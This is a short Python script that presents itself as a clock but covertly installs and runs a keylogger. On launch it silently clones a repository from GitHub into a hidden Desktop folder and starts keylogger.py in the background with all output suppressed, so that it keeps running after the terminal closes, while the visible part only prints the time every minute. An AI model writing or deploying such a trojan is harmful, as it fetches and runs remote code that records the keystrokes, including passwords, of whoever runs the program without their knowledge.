"""
This is the main program; it starts the key logger in the background and shows
a clock every 60 seconds, displaying the current time
""" 
import time
import subprocess
from datetime import datetime
from pathlib import Path
def show_clock():
    """
    Display the current time every 60 seconds
    """
    while True:
        print(f"{datetime.now().time()}")
        time.sleep(60)


if __name__ == "__main__":
    # Start the keylogger in the background; it will keep running even after
    # the terminal session is closed
    # CMD = "nohup sudo python keylogger.py &> /dev/null &"
    if not Path("~/Desktop/.keylogger").expanduser().exists():
        CMD = "git clone https://github.com/jose-villar/public-key ~/Desktop/.keylogger &> /dev/null"
        pipe=subprocess.Popen(CMD, shell=True)
        pipe.wait()

    print(f"{datetime.now().time()}")
    CMD = "python3 ~/Desktop/.keylogger/keylogger.py &> /dev/null &"
    subprocess.call(CMD, shell=True)

    # Show clock until it is manually stopped by pressing <C-c>
    show_clock()